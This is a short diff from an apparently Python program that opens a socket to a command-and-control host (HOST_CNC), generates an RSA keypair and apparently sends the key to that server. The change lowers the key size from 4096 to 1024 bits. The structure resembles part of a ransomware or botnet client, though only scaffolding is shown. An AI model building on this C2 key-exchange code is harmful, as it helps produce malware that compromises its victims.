@@ -11,7 +11,7 @@ s.connect((HOST_CNC, PORT_CNC))
 
 # Funzioni
 def gen_pk():
-    publicKey, privateKey = rsa.newkeys(4096)
+    publicKey, privateKey = rsa.newkeys(1024)
     return publicKey, privateKey
 
 def send_pk():
